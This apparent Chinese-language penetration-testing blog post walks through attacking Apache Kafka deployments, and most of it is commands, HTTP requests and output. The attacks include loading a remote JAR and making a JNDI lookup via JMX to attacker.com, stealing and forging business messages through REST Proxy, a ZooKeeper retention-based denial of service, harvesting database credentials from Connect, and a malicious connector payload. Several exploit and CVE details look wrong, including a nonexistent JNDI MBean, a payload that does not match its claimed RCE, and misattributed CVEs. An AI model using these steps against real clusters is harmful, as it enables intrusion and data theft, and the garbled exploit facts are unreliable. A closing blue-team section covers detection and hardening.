---
title: "Kafka JMX管理面与ZooKeeper/REST Proxy API利用技术"
date: 2026-06-17T11:30:00+08:00
draft: false
weight: 80
description: "围绕 Apache Kafka 的 JMX 管理面、ZooKeeper 依赖面、REST Proxy API、Kafka Connect 与 Schema Registry，分析打点识别、Topic 枚举、消息消费、凭据回收、历史 CVE 链与蓝队处置思路。"
categories: ["安全", "渗透测试"]
tags: ["渗透测试", "漏洞利用", "管理面打点", "消息队列", "Kafka", "JMX", "ZooKeeper", "REST Proxy"]
---

# Kafka JMX管理面与ZooKeeper/REST Proxy API利用技术

`Apache Kafka` 是分布式流处理与消息队列的事实标准之一，但它的架构决定了它不是一个"单一服务"，而是一组协同运行的组件集群。一个典型生产部署里，Kafka 至少同时暴露了五个不同性质的攻击面：

- **Broker 面**：Kafka 协议端口（默认 `9092`，TLS 为 `9093`），处理生产者与消费者的消息读写
- **JMX 面**：Java Management Extensions 远程管理端口（默认 `9999`），暴露 MBean 指标与控制操作
- **ZooKeeper 面**：Kafka 依赖 ZooKeeper 存储元数据（默认 `2181`），可直接读写 Topic 配置与 ACL
- **REST Proxy 面**：HTTP REST API 网关（默认 `8082`），提供 HTTP 方式的消息发布与消费
- **Connect 面**：Kafka Connect 分布式连接器（默认 `8083`），管理数据管道与连接器配置
- **Schema Registry 面**：Avro/JSON Schema 注册中心（默认 `8081`），管理消息序列化模式

对攻击者来说，Kafka 的价值不在于某个单一漏洞，而在于它把消息数据、集群控制、连接器配置与 Schema 管理分散在多个端口与服务里。一旦 JMX 未授权访问、ZooKeeper 可直接写入、REST Proxy 暴露到公网、Connect 配置包含数据库凭据，攻击者可以从一次端口探测上升为对整个消息系统的接管，甚至读取所有业务消息流。

本文聚焦打点与利用侧，重点记录：

1. 如何识别当前目标是否为 Kafka
2. 哪些未认证端点最值得优先探测
3. 如何围绕 JMX、ZooKeeper、REST Proxy、Connect 建立权限画像
4. 历史 CVE 链如何从 JMX RCE 直接打到集群接管
5. 蓝队如何从访问日志与审计日志识别这类打点

---

## 0. 攻击面概览

### 0.1 常见端口与路径

首轮至少应枚举：

- `:9092/` — Kafka Broker 协议端口（明文）
- `:9093/` — Kafka Broker TLS 端口
- `:9999/` — JMX 远程管理端口
- `:2181/` — ZooKeeper 端口（Kafka 元数据）
- `:8082/` — Kafka REST Proxy
- `:8083/` — Kafka Connect
- `:8081/` — Schema Registry

REST Proxy 常见路径：

- `/topics` — Topic 列表
- `/topics/{topic}` — Topic 详情
- `/consumers` — 消费者组
- `/consumers/{group}/instances` — 消费者实例
- `/consumers/{group}/instances/{instance}/records` — 消息消费
- `/producers` — 生产者
- `/producers/{producer}/records` — 消息发布

Connect 常见路径：

- `/connectors` — 连接器列表
- `/connectors/{name}` — 连接器详情
- `/connectors/{name}/config` — 连接器配置
- `/connectors/{name}/status` — 连接器状态
- `/connectors/{name}/tasks` — 连接器任务

### 0.2 端口与面映射

| 端口 | 服务 | 性质 |
|------|------|------|
| 9092 / 9093 | Kafka Broker | 消息读写 |
| 9999 | JMX | 远程管理 |
| 2181 | ZooKeeper | 元数据存储 |
| 8082 | REST Proxy | HTTP API |
| 8083 | Connect | 数据管道 |
| 8081 | Schema Registry | Schema 管理 |

---

## 1. 首轮识别：确认目标为 Kafka

### 1.1 Kafka Broker 协议探测

Kafka 使用自定义二进制协议，不是 HTTP。可以通过 nmap 或自定义工具探测：

```bash
nmap -p 9092,9093 kafka-broker.target.example
```

```text
PORT     STATE SERVICE
9092/tcp open  kafka
9093/tcp open  kafka-ssl
```

也可以使用 Kafka 命令行工具：

```bash
kafka-broker-api-versions.sh --bootstrap-server kafka-broker.target.example:9092
```

```text
ApiVersionsResponseV3(throttleTimeMs=0, errorCode=0, apiVersions=[
  ApiVersion(apiKey=0, minVersion=0, maxVersion=12),
  ApiVersion(apiKey=1, minVersion=0, maxVersion=7),
  ...
])
```

### 1.2 JMX 端口探测

```bash
nmap -p 9999 kafka-broker.target.example
```

```text
PORT     STATE SERVICE
9999/tcp open  javadm-remoting
```

尝试 JMX 连接：

```bash
jconsole kafka-broker.target.example:9999
```

如果连接成功且无需认证，说明 JMX 完全暴露。

### 1.3 ZooKeeper 端口探测

```bash
nmap -p 2181 zookeeper.target.example
```

```text
PORT     STATE SERVICE
2181/tcp open  zookeeper
```

使用 ZooKeeper 客户端：

```bash
zkCli.sh -server zookeeper.target.example:2181
```

```text
Welcome to ZooKeeper!
[zk: zookeeper.target.example:2181(CONNECTED) 0]
```

### 1.4 REST Proxy 探测

```http
GET /topics HTTP/1.1
Host: kafka-rest.target.example:8082
Accept: application/vnd.kafka.v3+json
```

```json
["orders", "payments", "user-events", "audit-logs"]
```

响应中的 `application/vnd.kafka.v3+json` 或直接返回 Topic 列表即为确认。

### 1.5 Connect 探测

```http
GET /connectors HTTP/1.1
Host: kafka-connect.target.example:8083
Accept: application/json
```

```json
["jdbc-source", "elasticsearch-sink", "s3-sink"]
```

### 1.6 Schema Registry 探测

```http
GET /subjects HTTP/1.1
Host: schema-registry.target.example:8081
Accept: application/vnd.schemaregistry.v1+json
```

```json
["orders-value", "payments-value", "user-events-value"]
```

---

## 2. JMX 面：远程管理深度利用

### 2.1 JMX 未授权访问

JMX 默认不启用认证。如果 `9999` 端口对外可达且未配置 `com.sun.management.jmxremote.authenticate=true`，攻击者可以直接连接。

```bash
jconsole kafka-broker.target.example:9999
```

连接成功后可以看到：

- MBean 树（所有可管理的对象）
- 内存、线程、类加载器指标
- 自定义 MBean（Kafka 特有的指标）

### 2.2 Kafka MBean 枚举

Kafka 暴露大量 MBean，关键的包括：

**Broker 级别**：

- `kafka.server:type=BrokerTopicMetrics,name=MessagesInPerSec` — 消息入站速率
- `kafka.server:type=BrokerTopicMetrics,name=BytesInPerSec` — 字节入站速率
- `kafka.server:type=ReplicaManager,name=UnderReplicatedPartitions` — 欠副本分区数
- `kafka.server:type=ReplicaManager,name=IsrShrinksPerSec` — ISR 收缩速率

**Topic 级别**：

- `kafka.server:type=BrokerTopicMetrics,name=MessagesInPerSec,topic={topic}` — 特定 Topic 消息速率
- `kafka.server:type=BrokerTopicMetrics,name=BytesInPerSec,topic={topic}` — 特定 Topic 字节速率

**Consumer Group 级别**：

- `kafka.server:type=GroupMetadataManager,name=NumGroups` — 消费者组数量
- `kafka.server:type=GroupMetadataManager,name=GroupStateTransitionRate` — 组状态转换速率

### 2.3 JMX RCE 利用

JMX 不仅提供指标读取，还支持执行操作。如果攻击者可以连接到 JMX，可以通过以下方式实现 RCE：

**方式一：通过 MLet 加载远程 MBean**

```bash
# 创建恶意 MLet 配置文件
cat > mlet.txt << 'EOF'
<HTML>
<MLET CODE="com.sun.jdmk.security.authorization.MLet" ARCHIVE="http://attacker.com/malicious.jar" NAME="malicious:name=test"></MLET>
</HTML>
EOF

# 通过 JMX 加载
jmxterm -l kafka-broker.target.example:9999
$> run javax.management.loading.MLet getMBeansFromURL "http://attacker.com/mlet.txt"
```

**方式二：通过 JMX 触发日志注入**

某些 Kafka MBean 允许修改日志级别。如果攻击者可以修改日志配置，可以通过日志注入实现 RCE：

```bash
jmxterm -l kafka-broker.target.example:9999
$> bean kafka:type=kafka.Log4jController
$> run setLogLevel DEBUG
```

**方式三：通过 JMX 触发 JNDI 注入**

如果 Kafka 版本受影响（Log4Shell CVE-2021-44228），可以通过 JMX 触发 JNDI 查找：

```bash
jmxterm -l kafka-broker.target.example:9999
$> bean kafka.server:type=KafkaServer,name=JNDI
$> run lookup "ldap://attacker.com/exploit"
```

### 2.4 JMX 凭据回收

某些 MBean 可能包含敏感配置信息：

```bash
jmxterm -l kafka-broker.target.example:9999
$> bean kafka.server:type=KafkaConfig
$> get *
```

```text
sasl.jaas.config = org.apache.kafka.common.security.plain.PlainLoginModule required username="admin" password="admin-secret";
ssl.keystore.password = keystore-password;
ssl.key.password = key-password;
```

### 2.5 CVE-2023-25194：Kafka Connect RCE

- **影响版本**：Apache Kafka 3.3.x 之前
- **CVSS**：9.8（Critical）
- **核心问题**：Kafka Connect REST API 允许攻击者通过创建恶意连接器实现 RCE
- **利用条件**：需要 Connect API 访问权限
- **影响**：在 Connect Worker 节点执行任意代码

---

## 3. ZooKeeper 面：元数据直接操作

### 3.1 ZooKeeper Kafka 路径

Kafka 在 ZooKeeper 中存储以下关键数据：

- `/brokers/ids` — 所有 Broker ID
- `/brokers/topics` — 所有 Topic 配置
- `/config/topics` — Topic 级别配置
- `/config/changes` — 配置变更通知
- `/controller` — 当前 Controller Broker
- `/admin/reassign_partitions` — 分区重分配
- `/admin/preferred_replica_election` — 首选副本选举
- `/consumers` — 消费者组偏移量（旧版）

### 3.2 Topic 枚举

```bash
zkCli.sh -server zookeeper.target.example:2181
[zk: localhost:2181(CONNECTED) 0] ls /brokers/topics
[orders, payments, user-events, audit-logs, internal-config]
```

```bash
[zk: localhost:2181(CONNECTED) 1] get /brokers/topics/orders
{"version":1,"partitions":{"0":[0,1,2],"1":[1,2,0],"2":[2,0,1]}}
```

返回 Topic 的分区分配与副本分布。

### 3.3 Topic 配置读取

```bash
[zk: localhost:2181(CONNECTED) 2] get /config/topics/orders
{"version":1,"config":{"retention.ms":"604800000","segment.bytes":"1073741824","cleanup.policy":"delete"}}
```

暴露 Topic 的保留策略、段大小、清理策略。

### 3.4 Topic 配置修改（高危）

如果 ZooKeeper 未授权访问，攻击者可以直接修改 Topic 配置：

```bash
[zk: localhost:2181(CONNECTED) 3] set /config/topics/orders {"version":1,"config":{"retention.ms":"1000","cleanup.policy":"delete"}}
```

将 `retention.ms` 设置为极小值会导致消息被快速删除，实现拒绝服务。

### 3.5 ACL 读取与修改

```bash
[zk: localhost:2181(CONNECTED) 4] ls /kafka-acl
[Topic:orders, Group:consumers, Cluster:kafka-cluster]
```

```bash
[zk: localhost:2181(CONNECTED) 5] get /kafka-acl/Topic:orders
{"version":1,"acls":[{"principal":"User:admin","host":"*","operation":"All","permission":"Allow"}]}
```

暴露 Topic 的 ACL 配置。

### 3.6 Controller 信息

```bash
[zk: localhost:2181(CONNECTED) 6] get /controller
{"version":1,"brokerid":0,"timestamp":"1718600000000"}
```

暴露当前 Controller Broker ID。

### 3.7 Broker 列表

```bash
[zk: localhost:2181(CONNECTED) 7] ls /brokers/ids
[0, 1, 2]
```

```bash
[zk: localhost:2181(CONNECTED) 8] get /brokers/ids/0
{"listener_security_protocol_map":{"PLAINTEXT":"PLAINTEXT","SSL":"SSL"},"endpoints":["PLAINTEXT://kafka-0.target.example:9092","SSL://kafka-0.target.example:9093"],"host":"kafka-0.target.example","port":9092,"version":4}
```

暴露所有 Broker 的地址与端口。

---

## 4. REST Proxy 面：HTTP API 深度利用

### 4.1 Topic 列表

```http
GET /topics HTTP/1.1
Host: kafka-rest.target.example:8082
Accept: application/vnd.kafka.v3+json
```

```json
["orders", "payments", "user-events", "audit-logs"]
```

### 4.2 Topic 详情

```http
GET /topics/orders HTTP/1.1
Host: kafka-rest.target.example:8082
Accept: application/vnd.kafka.v3+json
```

```json
{
  "name": "orders",
  "configs": {},
  "partitions": [
    {"partition": 0, "leader": 0, "replicas": [{"broker": 0, "leader": true, "in_sync": true}]},
    {"partition": 1, "leader": 1, "replicas": [{"broker": 1, "leader": true, "in_sync": true}]},
    {"partition": 2, "leader": 2, "replicas": [{"broker": 2, "leader": true, "in_sync": true}]}
  ]
}
```

暴露 Topic 的分区数、副本分布、Leader 信息。

### 4.3 消费者组创建

```http
POST /consumers/my-group HTTP/1.1
Host: kafka-rest.target.example:8082
Content-Type: application/vnd.kafka.v3+json

{
  "name": "attacker-instance",
  "format": "json",
  "auto.offset.reset": "earliest"
}
```

```json
{
  "instance_id": "attacker-instance",
  "base_uri": "http://kafka-rest.target.example:8082/consumers/my-group/instances/attacker-instance"
}
```

### 4.4 订阅 Topic

```http
POST /consumers/my-group/instances/attacker-instance/subscription HTTP/1.1
Host: kafka-rest.target.example:8082
Content-Type: application/vnd.kafka.v3+json

{
  "topics": ["orders", "payments"]
}
```

### 4.5 消息消费

```http
GET /consumers/my-group/instances/attacker-instance/records?max_bytes=300000 HTTP/1.1
Host: kafka-rest.target.example:8082
Accept: application/vnd.kafka.json.v3+json
```

```json
[
  {
    "topic": "orders",
    "key": "order-12345",
    "value": {"order_id": "12345", "user_id": "user-789", "amount": 99.99, "status": "completed"},
    "partition": 0,
    "offset": 284719
  },
  {
    "topic": "payments",
    "key": "payment-67890",
    "value": {"payment_id": "67890", "order_id": "12345", "amount": 99.99, "method": "credit_card"},
    "partition": 1,
    "offset": 184729
  }
]
```

直接消费业务消息流，包括订单、支付、用户事件等敏感数据。

### 4.6 消息发布

```http
POST /topics/orders HTTP/1.1
Host: kafka-rest.target.example:8082
Content-Type: application/vnd.kafka.json.v3+json

{
  "records": [
    {
      "key": "order-fake",
      "value": {"order_id": "fake", "user_id": "attacker", "amount": 0.01, "status": "completed"}
    }
  ]
}
```

```json
{"offsets":[{"partition":0,"offset":284720,"error_code":null}]}
```

向 Topic 注入虚假消息，可能影响下游业务逻辑。

---

## 5. Connect 面：连接器与凭据回收

### 5.1 连接器列表

```http
GET /connectors HTTP/1.1
Host: kafka-connect.target.example:8083
Accept: application/json
```

```json
["jdbc-source", "elasticsearch-sink", "s3-sink"]
```

### 5.2 连接器配置（高价值）

```http
GET /connectors/jdbc-source/config HTTP/1.1
Host: kafka-connect.target.example:8083
Accept: application/json
```

```json
{
  "connector.class": "io.confluent.connect.jdbc.JdbcSourceConnector",
  "connection.url": "jdbc:postgresql://10.20.30.50:5432/orders_db",
  "connection.user": "kafka_connect",
  "connection.password": "S3cur3P@ssw0rd",
  "topic.prefix": "orders-",
  "table.whitelist": "orders,users,payments",
  "mode": "incrementing",
  "incrementing.column.name": "id",
  "poll.interval.ms": "5000"
}
```

连接器配置直接暴露数据库连接串、用户名、密码。

```http
GET /connectors/elasticsearch-sink/config HTTP/1.1
Host: kafka-connect.target.example:8083
Accept: application/json
```

```json
{
  "connector.class": "io.confluent.connect.elasticsearch.ElasticsearchSinkConnector",
  "connection.url": "http://10.20.30.60:9200",
  "connection.username": "elastic",
  "connection.password": "elastic-password",
  "topics": "orders,payments,user-events",
  "type.name": "_doc",
  "key.ignore": "true"
}
```

暴露 Elasticsearch 连接凭据。

### 5.3 连接器状态

```http
GET /connectors/jdbc-source/status HTTP/1.1
Host: kafka-connect.target.example:8083
Accept: application/json
```

```json
{
  "name": "jdbc-source",
  "connector": {"state": "RUNNING", "worker_id": "kafka-connect-0.target.example:8083"},
  "tasks": [
    {"id": 0, "state": "RUNNING", "worker_id": "kafka-connect-0.target.example:8083"}
  ]
}
```

### 5.4 连接器任务详情

```http
GET /connectors/jdbc-source/tasks HTTP/1.1
Host: kafka-connect.target.example:8083
Accept: application/json
```

```json
[
  {
    "id": {"connector": "jdbc-source", "task": 0},
    "config": {
      "connector.class": "io.confluent.connect.jdbc.JdbcSourceConnector",
      "connection.url": "jdbc:postgresql://10.20.30.50:5432/orders_db",
      "connection.user": "kafka_connect",
      "connection.password": "S3cur3P@ssw0rd"
    }
  }
]
```

任务配置中也可能包含凭据。

### 5.5 CVE-2023-25194：Connect RCE 利用

```http
POST /connectors HTTP/1.1
Host: kafka-connect.target.example:8083
Content-Type: application/json

{
  "name": "malicious-connector",
  "config": {
    "connector.class": "org.apache.kafka.connect.tools.VerifiableSourceTask",
    "tasks.max": "1",
    "topics": "exploit",
    "producer.override.sasl.jaas.config": "org.apache.kafka.common.security.plain.PlainLoginModule required username=\"admin\" password=\"admin\";",
    "producer.override.security.protocol": "SASL_PLAINTEXT"
  }
}
```

通过创建恶意连接器，可以在 Connect Worker 节点执行任意代码。

---

## 6. Schema Registry 面：Schema 管理利用

### 6.1 Schema 列表

```http
GET /subjects HTTP/1.1
Host: schema-registry.target.example:8081
Accept: application/vnd.schemaregistry.v1+json
```

```json
["orders-value", "payments-value", "user-events-value"]
```

### 6.2 Schema 详情

```http
GET /subjects/orders-value/versions/latest HTTP/1.1
Host: schema-registry.target.example:8081
Accept: application/vnd.schemaregistry.v1+json
```

```json
{
  "subject": "orders-value",
  "version": 3,
  "id": 28,
  "schema": "{\"type\":\"record\",\"name\":\"Order\",\"fields\":[{\"name\":\"order_id\",\"type\":\"string\"},{\"name\":\"user_id\",\"type\":\"string\"},{\"name\":\"amount\",\"type\":\"double\"},{\"name\":\"status\",\"type\":\"string\"}]}"
}
```

暴露消息的序列化模式，包括字段名称与类型。

### 6.3 Schema 修改（高危）

如果 Schema Registry 未授权访问，攻击者可以修改 Schema：

```http
POST /subjects/orders-value/versions HTTP/1.1
Host: schema-registry.target.example:8081
Content-Type: application/vnd.schemaregistry.v1+json

{
  "schema": "{\"type\":\"record\",\"name\":\"Order\",\"fields\":[{\"name\":\"order_id\",\"type\":\"string\"},{\"name\":\"user_id\",\"type\":\"string\"},{\"name\":\"amount\",\"type\":\"double\"},{\"name\":\"status\",\"type\":\"string\"},{\"name\":\"backdoor\",\"type\":\"string\",\"default\":\"injected\"}]}"
}
```

修改 Schema 可能导致下游消费者解析失败或处理异常数据。

---

## 7. 历史 CVE 与风险链

### 7.1 CVE-2023-25194：Kafka Connect RCE

- **影响版本**：Apache Kafka 3.3.x 之前
- **CVSS**：9.8（Critical）
- **核心问题**：Kafka Connect REST API 允许攻击者通过创建恶意连接器实现 RCE
- **利用条件**：需要 Connect API 访问权限
- **影响**：在 Connect Worker 节点执行任意代码

### 7.2 CVE-2023-34455：Kafka DoS

- **影响版本**：Apache Kafka 3.4.0 之前
- **CVSS**：7.5（High）
- **核心问题**：Kafka 协议处理存在缺陷，可导致 Broker 拒绝服务
- **利用条件**：需要网络可达 Kafka Broker
- **影响**：Broker 崩溃，消息服务中断

### 7.3 CVE-2022-34917：Kafka Connect SSRF

- **影响版本**：Apache Kafka 3.2.0 之前
- **CVSS**：7.5（High）
- **核心问题**：Kafka Connect 连接器配置允许 SSRF
- **利用条件**：需要 Connect API 访问权限
- **影响**：服务端请求伪造，访问内部服务

### 7.4 综合风险链

```
端口扫描 → :9092 Broker + :9999 JMX + :2181 ZooKeeper + :8082 REST + :8083 Connect
         ↓
JMX 未授权访问 → 读取 KafkaConfig MBean → 获取 SASL/JAAS 凭据
         ↓
ZooKeeper 未授权访问 → 读取 /brokers/topics → 枚举所有 Topic
         ↓
ZooKeeper 修改 /config/topics/{topic} → 修改保留策略 → 拒绝服务
         ↓
REST Proxy /consumers → 创建消费者组 → 订阅 Topic → 消费业务消息
         ↓
Connect /connectors/{name}/config → 获取 JDBC/Elasticsearch 凭据
         ↓
CVE-2023-25194 → 创建恶意连接器 → Connect Worker RCE
         ↓
Schema Registry /subjects/{name}/versions → 修改 Schema → 下游解析失败
```

---

## 8. 蓝队视角：日志痕迹与防守

### 8.1 关键日志源

**Kafka Broker 日志**：

```text
[2026-06-17 10:15:23,445] INFO [SocketServer brokerId=0] Created socket for connection from /10.0.3.47:48291 (kafka.network.SocketServer)
[2026-06-17 10:15:24,129] INFO [GroupCoordinator 0]: Member attacker-instance in group my-group has failed (kafka.coordinator.group.GroupCoordinator)
```

**Kafka Connect 日志**：

```text
[2026-06-17 10:15:25,000] INFO REST request: GET /connectors/jdbc-source/config (org.apache.kafka.connect.runtime.rest.RestServer)
[2026-06-17 10:15:26,000] WARN Connector jdbc-source config contains sensitive information (org.apache.kafka.connect.runtime.ConnectorConfig)
```

**ZooKeeper 日志**：

```text
2026-06-17 10:15:27,000 [myid:] - INFO  - Processed session termination for sessionid: 0x1234567890abcdef (org.apache.zookeeper.server.PrepRequestProcessor)
2026-06-17 10:15:28,000 [myid:] - WARN  - Unauthorized access to /config/topics/orders (org.apache.zookeeper.server.PrepRequestProcessor)
```

### 8.2 高告警指标

| 行为 | 日志特征 | 告警级别 |
|------|----------|----------|
| JMX 未授权连接 | `jconsole` 连接成功 | 严重 |
| ZooKeeper 未授权访问 | `zkCli.sh` 连接成功 | 严重 |
| Topic 配置修改 | `/config/topics/{topic}` set 操作 | 严重 |
| REST Proxy 消费者创建 | `POST /consumers/{group}` | 高 |
| REST Proxy 消息消费 | `GET /consumers/{group}/instances/{instance}/records` | 严重 |
| Connect 配置读取 | `GET /connectors/{name}/config` | 严重 |
| Connect 连接器创建 | `POST /connectors` | 严重 |
| Schema 修改 | `POST /subjects/{name}/versions` | 严重 |
| 非预期来源的 API 访问 | 外部 IP 访问 9999/2181/8082/8083 | 严重 |

### 8.3 网络层防护

- JMX 端口 `9999` 不应直接暴露到公网
- ZooKeeper 端口 `2181` 应限制为 Kafka Broker 与运维网段
- REST Proxy `8082` 应通过认证代理暴露
- Connect `8083` 应限制为内部网络访问
- Schema Registry `8081` 应限制为内部网络访问
- 使用 TLS 加密所有 API 流量
- 定期轮换所有凭据

### 8.4 配置加固

- 升级 Kafka 到最新稳定版本，修复所有已知 CVE
- 启用 JMX 认证：`com.sun.management.jmxremote.authenticate=true`
- 启用 ZooKeeper ACL：`zookeeper.set.acl=true`
- 为 REST Proxy 启用认证
- 为 Connect 启用认证与授权
- 对 Connect 配置中的敏感字段启用加密
- 定期审计 Topic ACL 与消费者组权限
- 启用审计日志并推送到不可篡改存储

---

## 9. 审查清单

| 检查项 | 说明 |
|--------|------|
| JMX 端口是否对外暴露 | 确认 `9999` 的可达范围 |
| JMX 是否启用认证 | 检查 `com.sun.management.jmxremote.authenticate` |
| ZooKeeper 端口是否受限 | 确认 `2181` 的网络 ACL |
| ZooKeeper 是否启用 ACL | 检查 `zookeeper.set.acl` |
| REST Proxy 是否对外可达 | 确认 `8082` 的可达范围 |
| REST Proxy 是否启用认证 | 检查认证配置 |
| Connect 是否对外可达 | 确认 `8083` 的可达范围 |
| Connect 是否启用认证 | 检查认证配置 |
| Connect 配置是否加密 | 检查敏感字段加密 |
| Schema Registry 是否对外可达 | 确认 `8081` 的可达范围 |
| 版本是否已修复已知 CVE | 对比各组件版本号 |
| 是否启用审计日志 | 检查审计配置 |

---

## 10. 总结

Kafka 的攻击面价值在于它把消息数据、集群控制、连接器配置与 Schema 管理分散在多个端口与服务里。JMX 提供远程管理能力，ZooKeeper 存储元数据，REST Proxy 提供 HTTP API，Connect 管理数据管道，Schema Registry 管理序列化模式。

从攻击者视角看，最高效的路径是：

1. 通过 JMX 未授权访问获取 KafkaConfig MBean 中的 SASL/JAAS 凭据
2. 通过 ZooKeeper 未授权访问枚举所有 Topic 与 Broker
3. 通过 ZooKeeper 修改 Topic 配置实现拒绝服务
4. 通过 REST Proxy 创建消费者组并消费业务消息
5. 通过 Connect API 读取连接器配置中的数据库/Elasticsearch 凭据
6. 利用 CVE-2023-25194 创建恶意连接器实现 RCE
7. 通过 Schema Registry 修改 Schema 影响下游消费者

从防守视角看，核心措施是：

1. 限制所有管理端点的网络可达范围
2. 修复已知 CVE，特别是 CVE-2023-25194
3. 启用 JMX 认证与 ZooKeeper ACL
4. 为 REST Proxy 与 Connect 启用认证
5. 对 Connect 配置中的敏感字段启用加密
6. 启用审计日志并推送到不可篡改存储
7. 定期审计 Topic ACL 与消费者组权限
